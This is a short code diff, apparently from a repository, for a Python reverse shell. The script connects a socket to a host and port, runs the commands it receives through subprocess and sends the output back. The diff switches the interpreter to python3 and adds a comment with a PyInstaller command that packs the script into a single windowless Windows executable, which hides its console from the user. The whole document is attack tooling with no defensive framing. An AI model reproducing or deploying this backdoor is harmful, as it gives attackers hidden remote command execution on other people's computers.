@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 import socket, subprocess
 HOST =  '127.0.0.1'
 PORT = '5151'
@@ -14,3 +14,5 @@ while 1:
     stdout_value = proc.stdout.read() + proc.stderr.read()
     s.send(stdout_value)
 s.close()
+
+## C:\python27\python.exe C:\utils\pyinstaller-2.0\pyinstaller.py --out=C:\shell\ --noconsole --onefile C:\shell.py
